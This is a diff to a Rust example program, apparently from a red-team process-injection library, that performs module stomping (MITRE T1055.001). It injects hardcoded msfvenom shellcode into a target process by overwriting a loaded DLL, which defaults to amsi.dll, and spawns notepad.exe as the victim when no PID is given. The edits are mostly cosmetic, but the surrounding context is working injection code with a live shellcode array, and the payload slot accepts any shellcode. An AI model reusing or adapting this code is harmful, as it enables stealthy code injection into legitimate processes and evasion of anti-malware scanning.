@@ -10,8 +10,8 @@
 //! ./T1055_001_ModuleStomping.exe [PID] [BENIGN_DLL]
 //! ```
 //!
-//! * PID: Optional. If missing, spawns a new 'notepad.exe'.
-//! * BENIGN_DLL: Optional. The name of the DLL to load and stomp. Defaults to "amsi.dll".
+//! * PID        : (Optional) Process ID. If missing, a new 'notepad.exe' process is spawned.
+//! * BENIGN_DLL : (Optional) DLL to load and stomp. Defaults to "amsi.dll".
 
 #[cfg(not(feature = "tracing"))]
 mod logs {
@@ -31,8 +31,7 @@ use std::{env::args, process::Command};
 #[cfg(feature = "tracing")]
 use tracing::{error, info, warn};
 
-// Don't trust me, generate your own payloads!
-// msfvenom -p windows/x64/exec CMD=calc.exe -f rust
+// Payload: "Calc.exe"
 const SHELLCODE: &[u8] = &[
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -56,24 +55,27 @@ const SHELLCODE: &[u8] = &[
 
 fn main() {
     if let Err(e) = run() {
-        error!("{}", e);
+        error!("Error: {}", e);
     }
 }
 
 fn run() -> Result<()> {
     setup_logging();
     let (process_id, target_dll_name) = parse_args()?;
+
     info!("------------------------------------------------");
     info!("Target Process ID : {}", process_id);
     info!("Technique         : T1055.001 (Module Stomping)");
-    info!("Stomp Target      : {}", &target_dll_name);
+    info!("Stomp Target      : {}", target_dll_name);
     info!("------------------------------------------------");
+
     inject_stomping(process_id, target_dll_name)?;
-    info!("Injection completed.");
+
+    info!("Success: Injection completed.");
     Ok(())
 }
 
-/// Performs the Module Stomping injection.
+/// Performs Module Stomping Injection.
 fn inject_stomping(process_id: u32, target_dll_name: String) -> Result<()> {
     let payload = Payload::Shellcode {
         bytes: SHELLCODE.to_vec(),
@@ -85,6 +87,7 @@ fn inject_stomping(process_id: u32, target_dll_name: String) -> Result<()> {
         },
     };
     let technique = Technique::T1055_001(DynamicLinkLibrary::ModuleStomping(Some(target_dll_name)));
+
     InjectorBuilder::new()
         .target(Target::Pid(process_id))
         .technique(technique)
@@ -95,21 +98,20 @@ fn inject_stomping(process_id: u32, target_dll_name: String) -> Result<()> {
 /// Parses CLI arguments.
 fn parse_args() -> Result<(u32, String)> {
     let cli_args: Vec<String> = args().collect();
+
     // 1. Parse PID (Optional)
     let process_id = if cli_args.len() > 1 {
-        cli_args[1].parse::<u32>().map_err(|_| {
-            Error::Validation(format!(
-                "Invalid PID '{}'. Must be a positive integer.",
-                cli_args[1]
-            ))
-        })?
+        cli_args[1]
+            .parse::<u32>()
+            .map_err(|_| Error::Validation("Invalid PID. Must be a positive integer.".into()))?
     } else {
-        warn!("No PID provided. Spawning 'notepad.exe' as a target...");
-        let child_process = Command::new("notepad.exe")
+        warn!("No PID provided. Spawning 'notepad.exe' as target...");
+        let child = Command::new("notepad.exe")
             .spawn()
-            .map_err(|e| Error::Validation(format!("Failed to spawn dummy target: {}", e)))?;
-        child_process.id()
+            .map_err(|e| Error::Validation(format!("Failed to spawn target: {}", e)))?;
+        child.id()
     };
+
     // 2. Parse Benign DLL Name (Optional)
     let target_dll_name = if cli_args.len() > 2 {
         cli_args[2].clone()
